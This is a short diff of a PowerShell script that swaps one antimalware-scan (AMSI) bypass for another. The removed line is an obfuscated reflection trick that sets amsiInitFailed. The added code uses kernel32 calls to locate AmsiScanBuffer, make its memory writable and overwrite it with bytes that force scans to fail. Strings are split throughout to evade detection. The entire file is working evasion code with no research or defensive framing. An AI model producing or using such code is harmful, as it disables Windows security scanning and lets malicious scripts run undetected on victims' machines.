@@ -1,1 +1,32 @@
-  $yKxS  =  [typE]("{1}{0}" -F'EF','r')  ;   (  .("{2}{3}{0}{1}" -f 'aRIAbL','E','g','eT-V') yKXS  ).VALue."aS`SE`mbly".("{1}{0}{2}"-f'e','G','tType').Invoke(("{11}{2}{8}{4}{1}{3}{5}{0}{10}{7}{6}{9}" -f'ut','ageme','stem.','n','an','t.A','n.Amsi','atio','M','Utils','om','Sy')).("{0}{2}{1}"-f'Get','ld','Fie').Invoke(("{2}{0}{1}" -f 'I','nitFailed','amsi'),("{3}{4}{1}{2}{0}"-f'c','c,Sta','ti','NonPu','bli')).("{2}{0}{1}"-f'u','e','SetVal').Invoke(${n`UlL},${tr`Ue})
+$MethodDefinition = @"
+    [DllImport(`"kernel32`")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport(`"kernel32`")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport(`"kernel32`")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+"@
+
+$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
+$var = 'am'
+$var2 = $var + 'si'
+$var3 = $var2 + ".d" + "ll"
+$handle = [Win32.Kernel32]::GetModuleHandle($var3);
+[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, 'Am'+'siS'+'can'+'Buf'+'fer');
+[UInt32]$Size = 0x5;
+[UInt32]$ProtectFlag = 0x40;
+[UInt32]$OldProtectFlag = 0;
+[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
+
+$arr = New-Object Byte[] 6
+
+$arr[0] = [Byte]([UInt32]0xB8)
+$arr[1] = [Byte]([UInt32]0x57)
+$arr[2] = [Byte]([UInt32]0x00)
+$arr[3] = [Byte]([UInt32]0x07)
+$arr[4] = [Byte]([UInt32]0x80)
+$arr[5] = [Byte]([UInt32]0xC3)
+
+[System.Runtime.InteropServices.Marshal]::Copy($arr, 0, $BufferAddress, $arr.Length);
